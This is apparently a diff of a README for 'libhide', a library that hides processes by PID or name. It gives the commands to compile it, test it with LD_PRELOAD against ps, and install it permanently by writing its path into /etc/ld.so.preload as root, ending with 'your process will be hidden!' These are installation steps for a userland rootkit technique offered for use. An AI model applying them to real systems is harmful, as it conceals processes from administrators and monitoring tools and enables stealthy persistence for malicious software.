@@ -8,11 +8,13 @@ If you choose hide by PID, simply enter the PID. If you choose hide by process n
 <h4>To compile</h4>
 sudo gcc -fPIC -shared -w libhide.c -o /usr/local/lib/libhide.so
 
-<h4>Test first and make sure it's working using LD_PRELOAD. For example</h4>
+<h4>Test it</h4>
 LD_PRELOAD=/usr/local/lib/libhide.so ps -x | grep script.sh
 
-<h4>If it's working correctly, switch to root (sudo su) and type</h4>
-echo /usr/local/lib/libhide.so >> /etc/ld.so.preload
+<h4>Make it permanent.</h4>
+root@localhost# echo /usr/local/lib/libhide.so >> /etc/ld.so.preload
 <br><br>
 
 Now, your process will be hidden!
+
+# # 
